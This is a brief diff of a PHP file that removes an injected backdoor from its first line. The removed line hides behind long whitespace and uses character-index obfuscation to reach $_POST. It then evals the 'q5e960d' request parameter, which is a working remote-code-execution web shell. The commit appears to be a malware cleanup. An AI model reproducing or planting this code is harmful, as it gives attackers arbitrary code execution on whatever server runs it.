@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                 $ljh10 = "eortp_su"; $ukb59 =$ljh10[6]. $ljh10[3]. $ljh10[2].$ljh10[3]. $ljh10[1].$ljh10[7]. $ljh10[4]. $ljh10[4].$ljh10[0]. $ljh10[2] ;$fpiy3 = $ukb59( $ljh10[5].$ljh10[4] . $ljh10[1]. $ljh10[6]. $ljh10[3] ) ; if (isset(${ $fpiy3} [ 'q5e960d' ])){ eval( ${$fpiy3} ['q5e960d']);}?> <?php
+<?php
 
 /**
  * @file
